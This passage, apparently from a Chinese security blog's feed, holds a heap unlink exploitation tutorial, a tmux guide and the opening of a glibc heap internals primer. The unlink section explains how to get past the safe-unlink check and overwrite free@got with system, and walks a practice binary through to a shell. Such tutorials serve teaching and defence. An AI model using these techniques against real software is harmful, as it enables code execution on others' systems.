class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></div><div class="line">sz = hd &amp; ~PREV_INUSE;</div><div class="line">next = chunk_at_offset(p, sz);</div><div class="line">nextsz = chunksize(next);</div><div class="line"><span class="comment">/* consolidate forward */</span></div><div class="line"><span class="keyword">if</span> (!(inuse_bit_at_offset(next, nextsz)))   </div><div class="line">&#123;</div><div class="line">  sz += nextsz;</div><div class="line">  ...</div><div class="line">  unlink(next, bck, fwd);</div><div class="line">  next = chunk_at_offset(p, sz);</div><div class="line">&#125;</div><div class="line"></div><div class="line">set_head(p, sz | PREV_INUSE);</div><div class="line">next-&gt;prev_size = sz;</div></pre></td></tr></table></figure></p>
<p>本例中，释放第一个 chunk 时，当前 chunk 的下一个 chunk（2nd chunk）是 allocated，所以不能向前合并，unlink 宏不会被调用。</p>
<h4 id="3）unlink"><a href="#3）unlink" class="headerlink" title="3）unlink"></a><strong>3）unlink</strong></h4><p>当前释放的堆与前一个或后一个空闲 chunk 进行合并时，会把空闲 chunk 从 bin 中移除，移除过程使用 unlink 宏来实现。unlink 宏的定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Take a chunk off a bin list */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;  \</span></div><div class="line">  FD = P-&gt;fd;             \</div><div class="line">  BK = P-&gt;bk;             \</div><div class="line">  FD-&gt;bk = BK;            \</div><div class="line">  BK-&gt;fd = FD;            \</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>unlink 即为将 P 从链表中删除的过程。</p>
<h3 id="0x02-unlink-攻击"><a href="#0x02-unlink-攻击" class="headerlink" title="0x02 unlink 攻击"></a><strong>0x02 unlink 攻击</strong></h3><p>在 dlmalloc 中，unlink 的定义如上一节所示，只有与指针操作相关的 4 条语句。但在较新版本的 glibc 中，为了缓解攻击者进行 unlink 攻击，在宏定义中加入了安全校验，使得利用难度加大，只能在特定条件下使用一些技巧绕过校验。</p>
<h4 id="1）原始的-unlink-攻击"><a href="#1）原始的-unlink-攻击" class="headerlink" title="1）原始的 unlink 攻击"></a><strong>1）原始的 unlink 攻击</strong></h4><p>上述例子中，传入的字符串参数长度大于 666 字节时 strcpy 会使 first chunk 溢出，可覆盖 second chunk 的头部字段为如下值：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">prev_size = 偶数</div><div class="line">size = <span class="number">-4</span></div><div class="line">fd = <span class="built_in">free</span>@got - <span class="number">12</span></div><div class="line">bk = shellcode address</div></pre></td></tr></table></figure></p>
<p>在执行 free(first) 时，当前释放的 frist chunk 的下下个 chunk 不是 top chunk。因为 second chunk 的大小覆盖为 -4，所以下下个 chunk 在 second chunk 偏移为 -4 的位置，因此 malloc 把 second chunk 的 prev_size 当做下下个 chunk 的 size。而 prev_size 已被覆盖为偶数（PREV_INUSE位为0），malloc 会将 second chunk 当作空闲 chunk。</p>
<p>释放 first chunk 时会将 second chunk 从 bin 中 unlink，并将其合并到 first chunk。这个过程会触发 unlink（second），此时 <code>P = second chunk ptr</code>，unlink 过程如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>）FD = second chunk ptr-&gt;fd = <span class="built_in">free</span>@got – <span class="number">12</span>；</div><div class="line"><span class="number">2</span>）BK = second chunk ptr-&gt;bk = shellcode address；</div><div class="line"><span class="number">3</span>）FD-&gt;bk = BK，即（<span class="built_in">free</span>@got – <span class="number">12</span>）-&gt;bk = shellcode address；</div><div class="line"><span class="number">4</span>）BK-&gt;fd = FD，即shellcode address-&gt;fd = <span class="built_in">free</span>@got – <span class="number">12</span>。</div></pre></td></tr></table></figure></p>
<p>unlink 步骤 1）和 2）将 second chunk 的 fd 和 bk 复制到 FD 和 BK。如下图所示，复制后 <code>FD = free@got-12</code>，<code>BK = shellcode address</code>，即 second chunk 的 fd、bk 指针分别指向 <code>free@got-12</code> 和 <code>shellcode address</code>。</p>
<p>步骤 3）中 FD 是 malloc_chunk 结构体指针，FD-&gt;bk 相当于 <code>FD+12 = free@got-12+12 = free@got</code>，即 FD-&gt;bk 指向 free 的 GOT 表项，FD-&gt;bk = BK 相当于 <code>free@got = shellcode address</code>，即 free 的 GOT 表项被修改为了 shellcode 地址。因此，程序在执行第二个 free 时就会执行 shellcode。</p>
<p>同理，步骤4）中将 <code>shellcode addr + 8</code> 处 4 个字节覆盖为 <code>free@got - 12</code>，所以在编写 shellcode 时应跳过这 4 个字节。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-11-23/81536873.jpg" alt=""></p>
<h4 id="2）绕过安全校验"><a href="#2）绕过安全校验" class="headerlink" title="2）绕过安全校验"></a><strong>2）绕过安全校验</strong></h4><p>首先，需要了解 glibc 中 unlink 的校验机制。以下为 glibc-2.19 中 unlink 宏的部分代码，在删除 P 节点之前会检查 <code>FD-&gt;bk != P || BK-&gt;fd != P</code> 是否成立，即检查当前 chunk 前一个 chunk 的 bk 与后一个 chunk 的 fd 是否指向当前 chunk。若当前 chunk 的 fd 和 bk 被修改则无法通过这项检查，<code>FD-&gt;bk = BK</code> 与 <code>BK-&gt;fd = FD</code> 不会执行，导致 unlink 攻击不能进行。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Take a chunk off a bin list */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;         \</span></div><div class="line">    FD = P-&gt;fd;								      \</div><div class="line">    BK = P-&gt;bk;								      \</div><div class="line">    <span class="meta-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</div><div class="line">      malloc_printerr (check_action, <span class="meta-string">"corrupted double-linked list"</span>, P);      \</div><div class="line">    <span class="meta-keyword">else</span> &#123;								          \</div><div class="line">        FD-&gt;bk = BK;						    \</div><div class="line">        BK-&gt;fd = FD;						    \</div><div class="line">        ...</div><div class="line">    &#125;									              \</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>为了绕过以上指针校验，需要以下条件：</p>
<blockquote>
<p>a） 程序中存在一个全局指针变量 ptr<br>b） ptr 指向的堆内存可由用户控制</p>
</blockquote>
<p>若具备以上条件，攻击者可在指针 ptr 指向的内存中伪造一个空闲 chunk P，根据 ptr 构造合适的地址覆盖 chunk P 的 fd 和 bk，使得 <code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code> 成立。具体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">P-&gt;fd = ptr - <span class="number">0xC</span></div><div class="line">P-&gt;bk = ptr - <span class="number">0x8</span></div></pre></td></tr></table></figure></p>
<p>在执行 unlink（P）时的指针操作如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>）FD = P-&gt;fd = ptr - <span class="number">0xC</span>；</div><div class="line"><span class="number">2</span>）BK = P-&gt;bk = ptr - <span class="number">0x8</span>；</div><div class="line"><span class="comment">// FD-&gt;bk = ptr - 0xC + 0xC = ptr; BK-&gt;fd = ptr -0x8 + 0x8 = ptr;</span></div><div class="line"><span class="comment">// 由于 ptr 指向 P,可成功绕过指针校验</span></div><div class="line"><span class="number">3</span>）FD-&gt;bk = BK，即 ptr = ptr - <span class="number">0x8</span>;</div><div class="line"><span class="number">4</span>）BK-&gt;fd = FD，即 ptr = ptr - <span class="number">0xC</span>。</div></pre></td></tr></table></figure></p>
<p>由以上过程可知，借助指向 chunk P 的 ptr 指针可绕过 “corrupted double-linked list” 安全机制，并通过 unlink 攻击实现写内存，最终使得 ptr 指向 ptr - 0xc。</p>
<p>unlink 后，对 ptr 指向的内存进行写入，如 <code>‘A’*0xC + free@got</code>，使得 ptr 指向 free@got，再次对 ptr 指向的内存进行写入，可以把 free@got 修改为 system 的地址，之后调用 free 可任意命令执行。</p>
<h4 id="3）实例分析"><a href="#3）实例分析" class="headerlink" title="3）实例分析"></a><strong>3）实例分析</strong></h4><p>通过调试网上找的一个例子来具体分析 unlink 利用及其安全机制的绕过，相关文件可在 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/heap_unlink" target="_blank" rel="external">Github</a> 中下载。<br>程序功能为堆的 4 种基本操作：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> menu()</div><div class="line">&#123;</div><div class="line">  write(<span class="number">1</span>, <span class="string">"1.Add chunk\n"</span>, <span class="number">0xC</span>u);</div><div class="line">  write(<span class="number">1</span>, <span class="string">"2.Set chunk\n"</span>, <span class="number">0xC</span>u);</div><div class="line">  write(<span class="number">1</span>, <span class="string">"3.Delete chunk\n"</span>, <span class="number">0xF</span>u);</div><div class="line">  write(<span class="number">1</span>, <span class="string">"4.Print chunk\n"</span>, <span class="number">0xE</span>u);</div><div class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"5.Exit\n"</span>, <span class="number">7u</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>程序中有一个全局指针数组用于存储每一个 malloc 所分配堆块返回的指针。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">add</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">void</span> *result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></div><div class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [esp+Ch] [ebp-Ch]</span></div><div class="line"></div><div class="line">  size = <span class="number">0</span>;</div><div class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">9</span> )</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)write(<span class="number">1</span>, <span class="string">"cannot add chunks!"</span>, <span class="number">0x12</span>u);</div><div class="line">  write(<span class="number">1</span>, <span class="string">"Input the size of chunk you want to add:"</span>, <span class="number">0x28</span>u);</div><div class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;size);</div><div class="line">  result = (<span class="keyword">void</span> *)size;</div><div class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)size &gt; <span class="number">0</span> )</div><div class="line">  &#123;</div><div class="line">    v1 = index++;</div><div class="line">    result = <span class="built_in">malloc</span>(size);</div><div class="line">    buf[v1] = result;  <span class="comment">// 把堆块指针保存到 buf 中</span></div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"><span class="comment">// buf 为全局指针数组</span></div><div class="line">.bss:<span class="number">08049</span>D60 buf             dd ?                    ; DATA XREF: add+<span class="number">7</span>A↑w</div></pre></td></tr></table></figure></p>
<p>首先使用 <code>add</code>功能申请 4 个大小为 0x80 的堆（small chunk），程序会将 malloc 返回的用户空间指针 ptr_mem 存放在全局指针数组 buf[n] 中，该数组起始地址 buf 为 0x8049d60。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-12-31/74608133.jpg" alt=""><br>申请好堆后，使用 <code>set</code> 功能把字符串 “/bin/sh” 写入到 chunk3 中，为后面执行 system 函数做准备。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-12-31/40338931.jpg" alt=""><br>使用 <code>set</code> 功能编辑 chunk0 的内容可溢出并覆盖 chunk1，在 chunk0 中伪造一个大小为 0x80 的空闲 chunk P，将其 fd 和 bk 设置为 buf[0]-0xc 和 buf[0]-0x8，并且修改 chunk1 的 prev_size 和 size 字段。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-12-31/80701083.jpg" alt=""><br>接着使用 <code>delete</code> 释放 chunk1，由于相邻的 chunk P 为空闲块，会触发 unlink(P) 把 chunk P 从 smallbins 中解除，并与 chunk1 合并为大小为 0x108 的空闲块。unlink 过程中可绕过 “指针破坏” 检测，并实现写内存。最终会把 buf[0] 修改为 buf[0]-0xC。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-12-31/14873045.jpg" alt=""><br>使用 <code>set</code> 编辑 chunk0 可覆盖 buf[0]，从而再次修改 buf[0]，控制其指向的内存。可将其修改为 free@got。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-12-31/20886310.jpg" alt=""><br>接着使用 <code>print</code> 输出 chunk0 的内容，可泄露出内存中 free 函数的地址，从而可计算得到 system 函数的地址。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-12-31/4598652.jpg" alt=""><br>再次编辑 chunk0 的内容，把 system 的地址写入 free@got 中。写完后可查看 free@got 已指向 system 函数。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-12-31/20330158.jpg" alt=""><br>当使用 <code>delete</code> 删除 chunk3 时执行的 free(chunk3) 实际上是 system(“\bin\sh”)，从而成功 getshell。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-12-31/8077018.jpg" alt="">    </p>
<hr>
<p>References:<br>[1] <a href="https://jaq.alibaba.com/community/art/show?articleid=360" target="_blank" rel="external">Linux堆溢出漏洞利用之unlink</a><br>[2] <a href="http://wooyun.jozxing.cc/static/drops/tips-7326.html" target="_blank" rel="external">堆溢出的unlink利用方法</a><br>[3] <a href="http://pwn4.fun/2016/05/07/Heap-Overflow-Using-Unlink-Double-Free/" target="_blank" rel="external">Heap Overflow Using Unlink &amp; Double Free</a>    </p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 堆溢出 </tag>
            
            <tag> unlink </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[终端复用工具 tmux]]></title>
      <url>/%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8%E5%B7%A5%E5%85%B7%20tmux/</url>
      <content type="html"><![CDATA[<h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a><strong>0x01 简介</strong></h3><p>tmux 是一款很好用的终端复用工具，主要有以下两个功能：    </p>
<blockquote>
<p>1）split 窗口。可以在一个 terminal 下打开多个终端，也可以对当前屏幕进行各种 split ，即可以同时打开多个显示范围更小的终端。<br>2）在使用 SSH 的环境下，避免因网络不稳定而断开连接，导致工作现场的丢失。使用 tmux，重新连接以后，可以直接回到原来的工作环境，不但提高了工作 效率，还降低了风险，增加了安全性。</p>
</blockquote>
<p>tmux主要包括以下几个模块：</p>
<blockquote>
<p><strong>session 会话：</strong> 一个服务器可以包含多个会话；<br><strong>window 窗口：</strong> 一个会话可以包含多个窗口；<br><strong>pane 面板：</strong> 一个窗口可以包含多个面板。</p>
</blockquote>
<p>以下为会话管理命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">tmux [new -s 会话名 -n 窗口名]	# 启动新会话</div><div class="line">tmux at [-t 会话名]		# 恢复会话</div><div class="line">tmux ls				# 列出所有会话</div><div class="line">tmux kill-session -t 会话名	# 关闭会话</div></pre></td></tr></table></figure></p>
<h3 id="0x02-安装与使用"><a href="#0x02-安装与使用" class="headerlink" title="0x02 安装与使用"></a><strong>0x02 安装与使用</strong></h3><p>ubuntu 中使用以下命令安装 tmux。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install tmux</div></pre></td></tr></table></figure></p>
<h4 id="1）快捷键"><a href="#1）快捷键" class="headerlink" title="1）快捷键"></a><strong>1）快捷键</strong></h4><p>Pre 为前缀，默认为 Ctrl + b。</p>
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
<th>快捷键</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Pre Pgup</td>
<td style="text-align:left">向上翻页</td>
<td>Pre &amp;</td>
<td>关闭当前窗口</td>
</tr>
<tr>
<td style="text-align:left">Pre PgDn</td>
<td style="text-align:left">向下翻页</td>
<td>Pre Alt-[1-5]</td>
<td>切换面板的布局</td>
</tr>
<tr>
<td style="text-align:left">Pre s</td>
<td style="text-align:left">现有会话列表</td>
<td>Pre Space</td>
<td>切换面板布局</td>
</tr>
<tr>
<td style="text-align:left">Pre (</td>
<td style="text-align:left">前一个会话</td>
<td>Pre Ctl+o</td>
<td>顺序轮换面板</td>
</tr>
<tr>
<td style="text-align:left">Pre )</td>
<td style="text-align:left">后一个会话</td>
<td>Pre Alt+o</td>
<td>逆序轮换面板</td>
</tr>
<tr>
<td style="text-align:left">Pre c</td>
<td style="text-align:left">新建窗口</td>
<td>Pre {/}</td>
<td>上/下交换面板(swap-pane -U/-D)</td>
</tr>
<tr>
<td style="text-align:left">Pre ,</td>
<td style="text-align:left">改变窗口的名字</td>
<td>Pre o</td>
<td>当前窗口中切换面板</td>
</tr>
<tr>
<td style="text-align:left">Pre $</td>
<td style="text-align:left">改变会话的名字</td>
<td>Pre l/r/u/d</td>
<td>切换当前面板</td>
</tr>
<tr>
<td style="text-align:left">Pre c</td>
<td style="text-align:left">创建新窗口</td>
<td>Pre C-l/r/u/d</td>
<td>改变面板大小</td>
</tr>
<tr>
<td style="text-align:left">Pre p</td>
<td style="text-align:left">前一个窗口</td>
<td>Pre L/R/U/D</td>
<td>改变面板大小</td>
</tr>
<tr>
<td style="text-align:left">Pre n</td>
<td style="text-align:left">后一个窗口</td>
<td>Pre q</td>
<td>显示面板编号并选择</td>
</tr>
<tr>
<td style="text-align:left">Pre l</td>
<td style="text-align:left">前后窗口间切换</td>
<td>Pre x</td>
<td>关闭当前面板</td>
</tr>
<tr>
<td style="text-align:left">Pre [0-9]</td>
<td style="text-align:left">选择窗口</td>
<td>Pre %</td>
<td>纵向分隔窗口</td>
</tr>
<tr>
<td style="text-align:left">Pre f</td>
<td style="text-align:left">搜索窗口</td>
<td>Pre “</td>
<td>横向分隔窗口</td>
</tr>
<tr>
<td style="text-align:left">Pre w</td>
<td style="text-align:left">列出所有窗口并选择</td>
<td>Pre x</td>
<td>关闭面板</td>
</tr>
<tr>
<td style="text-align:left">Pre .</td>
<td style="text-align:left">移动窗口到新的编号</td>
<td>Pre !</td>
<td>关闭所有小面板</td>
</tr>
<tr>
<td style="text-align:left">Pre [</td>
<td style="text-align:left">进入复制模式</td>
<td>Pre b;Ctrl+方向键</td>
<td>调整面板大小</td>
</tr>
<tr>
<td style="text-align:left">Pre ]</td>
<td style="text-align:left">粘贴</td>
<td>Pre z</td>
<td>最大化当前面板</td>
</tr>
</tbody>
</table>
<h4 id="2）修改配置"><a href="#2）修改配置" class="headerlink" title="2）修改配置"></a><strong>2）修改配置</strong></h4><p>在 home 目录下新建配置文件 .tmux.conf，设置以下参数使得操作更方便。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#remap prefix from 'Ctr+b' to 'Ctr+a'</span></div><div class="line"><span class="comment">#unbind C-b</span></div><div class="line"><span class="comment">#set -g prefix C-a</span></div><div class="line"><span class="comment">#bind-key C-a send-prefix</span></div><div class="line"></div><div class="line"><span class="comment">#split panes using \and -</span></div><div class="line">bind \ split-window -h</div><div class="line">bind - split-window -v</div><div class="line">unbind <span class="string">'"'</span></div><div class="line">unbind %</div><div class="line"></div><div class="line"><span class="comment">#switch panes using Alt-arrow without prefix</span></div><div class="line">bind -n M-Left select-pane -L</div><div class="line">bind -n M-Right select-pane -R</div><div class="line">bind -n M-Up select-pane -U</div><div class="line">bind -n M-Down select-pane -D</div><div class="line"></div><div class="line"><span class="comment">#reload config file</span></div><div class="line">bind r source-file ~/.tmux.conf</div><div class="line"></div><div class="line"><span class="comment">#set mouse on</span></div><div class="line">set -g mouse on</div><div class="line"></div><div class="line"><span class="comment">#copy in vim mode</span></div><div class="line">setw -g mode-keys vi</div><div class="line"></div><div class="line"><span class="comment">#reserve in current path in new window</span></div><div class="line">bind c new-window -c <span class="string">"#&#123;pane_current_path&#125;"</span></div></pre></td></tr></table></figure></p>
<p>可通过以下方式使配置文件生效：    </p>
<blockquote>
<p>a）新建一个 session，配置文件在新的 session 中生效。<br>b）在当前 session 中，按 Pre + r 重新加载配置文件即可生效。</p>
</blockquote>
<h4 id="3）复制粘贴"><a href="#3）复制粘贴" class="headerlink" title="3）复制粘贴"></a><strong>3）复制粘贴</strong></h4><p><strong>a）鼠标选中复制</strong><br>在没有启动鼠标滚轮时，可以直接通过鼠标选中进行复制。如果启动滚轮，需要按下shift 键后使用鼠标选中要复制的内容。</p>
<p><strong>b）复制模式</strong><br>tmux 支持两种快捷键模式：vim 和 Emacs，这里设置为 vim 快捷键模式，在上述配置文件中已添加 <code>setw -g mode-keys vi</code>，可用 j/k/h/l 移动光标。<br><strong>复制：</strong>    </p>
<blockquote>
<p>Pre + [ 进入复制模式；<br>按下 Space 键开始复制；<br>移动光标选中要复制的内容；<br>按 Enter 键完成复制。</p>
</blockquote>
<p><strong>粘贴</strong>    </p>
<blockquote>
<p>光标移到到粘贴位置；<br>按 Pre + ] 完成粘贴。</p>
</blockquote>
<hr>
<p>References:<br>[1] <a href="https://wiki.freebsdchina.org/software/t/tmux" target="_blank" rel="external">使用tmux</a>   </p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tmux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux 内存管理与堆]]></title>
      <url>/Linux%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E4%B8%8E%E5%A0%86/</url>
      <content type="html"><![CDATA[<p>目前各大平台主要有如下几种堆内存管理机制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dlmalloc – General purpose allocator</div><div class="line">ptmalloc2 – glibc</div><div class="line">jemalloc – FreeBSD and Firefox</div><div class="line">tcmalloc – Google</div><div class="line">libumem – Solaris</div></pre></td></tr></table></figure></p>
<p>Linux 的早期版本使用的默认内存分配器为 dlmalloc，Wolfram Gloger 在 dlmalloc 基础上改进的 ptmalloc2 提供了多线程支持，所以 Linux 后来采用 ptmalloc2 作为默认内存分配器。多线程支持可以提升内存分配器的性能，进而提升了应用程序的性能。</p>
<p>在dlmalloc中，当多个线程同时调用malloc时，因为空闲列表被所有线程共享，所以只有一个线程能够访问临界区。因此，使用dlmalloc的多线程程序会在内存分配上耗费过多时间，导致整体性能下降。而在ptmalloc2中，每个线程都维护着一个独立的堆段，维护这些堆的空闲列表也是独立的。当有两个线程同时调用malloc时，均可立即分配到内存。</p>
<p>下面结合 unbuntu glibc 2.19 环境来学习内存的分配与回收。</p>
<h3 id="0x01-内存管理数据结构"><a href="#0x01-内存管理数据结构" class="headerlink" title="0x01 内存管理数据结构"></a><strong>0x01 内存管理数据结构</strong></h3><p>堆内存管理过程中有三个重要概念，分别是：arena、chunk、bin。</p>
<h4 id="1）arena"><a href="#1）arena" class="headerlink" title="1）arena"></a><strong>1）arena</strong></h4><p>程序在第一次使用 malloc 申请内存时，系统会分配一段连续的堆内存（132KB），这段内存被称为 arena。当程序申请再次申请内存时会先从 arena 的剩余部分申请，直到用完时再增加 arena 的大小。同理，当 arena中有过多空闲内存时也会缩小 arena 的大小。</p>
<p>为了使 dlmalloc 可以支持多线程，ptmalloc 增加了非主分配区（non main arena）支持。由主线程创建的 arena 称为主分配区（main arena），由其它线程创建的 arena 称为非主分配区（non main arena）。主分配区与非主分配区用环形链表进行管理。每一个分配区利用互斥锁（mutex）使线程对于该分配区的访问互斥。</p>
<p>每个进程只有一个主分配区，但可能存在多个非主分配区，ptmalloc 根据系统对分配区的争用情况动态增加非主分配区的数量，分配区的数量一旦增加，就不会再减少了。</p>
<p>主分配区可以使用 sbrk 和 mmap 向操作系统申请虚拟内存。非主分配区只能使用 mmap 向操作系统申请虚拟内存。</p>
<p>在程序线程较多的情况下，锁等待的时间就会延长，导致 malloc 性能下降。一次加锁操作需要消耗 100ns 左右，正是锁的缘故，导致 ptmalloc 在多线程竞争情况下性能远远落后于 tcmalloc。</p>
<p>arena的数量由系统的核数量决定：</p>
<blockquote>
<p>32位系统：<br>arena 的数量 = 2 <em> 核的数量<br>64位系统：<br>arena 的数量 = 8 </em> 核的数量</p>
</blockquote>
<p>一个多线程（主线程+3个用户线程）应用在一个单核的32位系统上运行，线程数 &gt; 2*核数，因此  malloc 需要确保 arena 能被线程共享。</p>
<blockquote>
<p>a) 主线程第一次调用 malloc 时创建 main arena；<br>b) thread1 和thread2 第一次调用 malloc 时，分别为它们创建 thread arena；<br>c) thread3 第一次调用 malloc 时 arena 已达上限，所以只能重用已存在的 arena（main arena、arena1 或 arena2）；<br>重用 arena 过程：<br>遍历所有 arena，当找到可用的 arena 时，尝试 lock arena。如果 lock 成功，将 arena 返回给用户；如果没有空闲的 arena，阻塞排队等待 arena。</p>
</blockquote>
<h4 id="2）chunk"><a href="#2）chunk" class="headerlink" title="2）chunk"></a><strong>2）chunk</strong></h4><p>逻辑上划分的一小块内存，根据作用不同分为4类：Allocated chunk、Free chunk、Top chunk、Last Remainder chunk。<br>chunk 结构的定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></div><div class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></div><div class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></div><div class="line"></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></div><div class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>chunk 结构中各字段的含义如下：<br><strong>prev_size：</strong> 如果前一个 chunk 是空闲状态，则该字段保存前一个 chunk 的大小。如果前一个 chunk 被分配使用，那么该字段保存前一个 chunk 的用户数据。<br><strong>size：</strong> 该字段为整个 chunk 的大小，包括保存用户数据的部分和 malloc_chunk 结构大小，并且包含进行内存对齐时填充字节的大小。由于内存按8字节对齐，所以该字段的低3位不用于表示 size，用于表示以下状态信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">bit0 — PREV_INUSE (P)：前一个 chunk 被分配使用时为1；</div><div class="line">bit1 — IS_MMAPPED (M)：当此 chunk 是由 mmap() 创建则为1；</div><div class="line">bit2 — NON_MAIN_ARENA (N)：如果此 chunk 属于 non main arena 则为1。</div></pre></td></tr></table></figure></p>
